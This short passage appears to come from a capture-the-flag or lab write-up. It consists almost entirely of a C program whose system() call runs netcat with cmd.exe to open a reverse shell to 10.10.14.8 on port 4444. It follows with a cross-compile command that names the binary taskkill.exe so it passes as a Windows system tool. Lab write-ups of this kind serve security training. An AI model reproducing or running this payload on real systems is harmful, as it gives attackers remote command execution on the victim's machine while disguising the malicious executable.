```
#include<stdlib.h>

int main()
{

    system("nc.exe -e cmd.exe 10.10.14.8 4444");
    return 0;
}
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250905090403.png)

```
x86_64-w64-mingw32-gcc rev.cpp -o taskkill.exe
```
